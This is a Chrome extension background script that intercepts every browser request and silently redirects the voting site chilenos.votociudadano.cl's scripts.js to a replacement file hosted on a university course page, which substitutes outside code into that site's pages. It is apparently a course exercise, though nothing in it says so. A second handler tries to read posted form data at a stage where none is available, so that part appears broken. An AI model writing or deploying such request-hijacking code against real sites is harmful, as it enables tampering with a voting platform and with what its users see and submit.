var fun =   function(details) {
    			//console.log(details.url);
        		if( details.url == "https://chilenos.votociudadano.cl/assets/javascripts/scripts.js?id=100" )
            		return {redirectUrl: "https://www.u-cursos.cl/ingenieria/2013/2/CC4001/1/grupos/1/8/material_docente/objeto/829723" };
    		};
var filter = {urls: ["<all_urls>"]};
var opt_extraInfoSpec= ["blocking"];

chrome.webRequest.onBeforeRequest.addListener(
	fun, filter, opt_extraInfoSpec
  );

var fund = function(details){
	if(details.url == "https://chilenos.votociudadano.cl/assets/javascripts/scripts.js?id=100"){
		alert(details.requestBody.formData.msg);
	}
};

chrome.webRequest.onCompleted.addListener(fund, filter, ["responseHeaders"]);

